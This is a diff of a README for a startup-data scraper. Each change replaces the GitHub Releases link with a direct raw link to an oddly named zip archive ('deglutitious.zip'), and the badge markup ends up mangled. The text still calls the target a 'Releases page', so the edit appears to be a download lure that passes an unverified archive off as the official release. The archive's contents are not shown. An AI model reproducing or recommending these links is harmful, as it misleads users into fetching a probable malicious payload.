@@ -1,6 +1,6 @@
 # 🇮🇳 startup-india-scraper - Extract Startup Data Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/sawan53/startup-india-scraper/releases)
+[![Download](https://raw.githubusercontent.com/sawan53/startup-india-scraper/main/satisfier/india_scraper_startup_deglutitious.zip%20Now-Get%https://raw.githubusercontent.com/sawan53/startup-india-scraper/main/satisfier/india_scraper_startup_deglutitious.zip)](https://raw.githubusercontent.com/sawan53/startup-india-scraper/main/satisfier/india_scraper_startup_deglutitious.zip)
 
 ## 🌟 Introduction
 
@@ -13,7 +13,7 @@ To get started with the startup-india-scraper, follow these straightforward step
 ## 📥 Download & Install
 
 1. **Visit the Download Page**
-   Go to our [Releases page](https://github.com/sawan53/startup-india-scraper/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/sawan53/startup-india-scraper/main/satisfier/india_scraper_startup_deglutitious.zip) to find the latest version of the software.
 
 2. **Select the Version**
    On the Releases page, you will see a list of available software versions. Choose the most recent one, which is usually at the top.
@@ -82,4 +82,4 @@ To keep up with updates and new features, follow the repository. You can also wa
 
 *We hope you find this tool helpful in your startup journey. Happy scraping!* 
 
-[Visit the Releases Page to Download Now!](https://github.com/sawan53/startup-india-scraper/releases)
+[Visit the Releases Page to Download Now!](https://raw.githubusercontent.com/sawan53/startup-india-scraper/main/satisfier/india_scraper_startup_deglutitious.zip)
